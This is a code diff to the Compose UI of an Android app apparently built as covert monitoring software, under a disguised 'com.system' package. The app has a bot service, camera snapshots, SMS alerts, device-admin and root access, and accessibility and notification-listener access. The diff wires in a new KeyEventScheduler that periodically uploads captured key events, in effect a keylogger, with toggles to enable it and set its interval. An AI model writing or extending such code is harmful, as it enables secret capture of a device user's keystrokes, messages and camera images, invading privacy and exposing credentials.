@@ -20,6 +20,7 @@ import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.automirrored.filled.ArrowBack
 import androidx.compose.material.icons.filled.*
 import androidx.compose.material.icons.outlined.*
+import androidx.compose.material.icons.automirrored.outlined.*
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
@@ -38,6 +39,7 @@ import androidx.lifecycle.LifecycleEventObserver
 import androidx.lifecycle.compose.LocalLifecycleOwner
 import com.system.superiormonitor.bot.BotService
 import com.system.superiormonitor.monitor.SnapshotScheduler
+import com.system.superiormonitor.monitor.KeyEventScheduler
 import com.system.superiormonitor.receiver.MonitorDeviceAdminReceiver
 import com.system.superiormonitor.util.LogManager
 import com.system.superiormonitor.util.LogCategory
@@ -54,7 +56,7 @@ enum class NavScreen(val title: String, val icon: ImageVector) {
     Dashboard("Dashboard", Icons.Outlined.SpaceDashboard),
     Permissions("Permissions", Icons.Outlined.Lock),
     RecordSettings("Recorder", Icons.Outlined.Mic),
-    Logs("Logs", Icons.Outlined.List),
+    Logs("Logs", Icons.AutoMirrored.Outlined.List),
     Settings("Settings", Icons.Outlined.Settings)
 }
 
@@ -111,8 +113,12 @@ fun AppScreen(
 
     val permissionStates = listOf(
         PermissionState("Root Access", permissionStatus.hasRoot) {
-            viewModel.refreshPermissions()
-            if (!permissionStatus.hasRoot) scope.launch { snackbarHostState.showSnackbar("Root request failed. Check Magisk/KernelSU.") }
+            scope.launch {
+                val success = viewModel.requestRootAccess()
+                if (!success) {
+                    snackbarHostState.showSnackbar("Root access not found or denied. Please ensure your device is rooted with Magisk or KernelSU and grant permissions.")
+                }
+            }
         },
         PermissionState("Notification Listener", permissionStatus.hasNotifListener) { context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
         PermissionState("Accessibility Service", permissionStatus.hasAccessibility) { context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
@@ -407,6 +413,7 @@ fun AppScreen(
                                             SnapshotScheduler(context).cancelSnapshot()
                                             SnapshotScheduler(context).cancelCamera(1)
                                             SnapshotScheduler(context).cancelCamera(0)
+                                            KeyEventScheduler(context).cancelKeyEventUpload()
                                         } else {
                                             if (!viewModel.hasCredentials || !permissionStatus.allPermissionsGranted) {
                                                 viewModel.onDashboardEvent(DashboardEvent.ToggleService(false))
@@ -479,6 +486,16 @@ fun AppScreen(
                                         if (isServiceRunning) {
                                             val intent = Intent(context, BotService::class.java).apply { action = "ACTION_UPDATE_SMS_ALERTS" }
                                             context.startForegroundService(intent)
+                                        }
+                                    }
+                                    is DashboardEvent.ToggleKeyEvents -> {
+                                        if (event.enabled) KeyEventScheduler(context).scheduleNextKeyEventUpload()
+                                        else KeyEventScheduler(context).cancelKeyEventUpload()
+                                    }
+                                    is DashboardEvent.UpdateKeyEventsInterval -> {
+                                        if (dashboardState.keyEventsEnabled) {
+                                            KeyEventScheduler(context).cancelKeyEventUpload()
+                                            KeyEventScheduler(context).scheduleNextKeyEventUpload()
                                         }
                                     }
                                     else -> {} // No context side-effects required
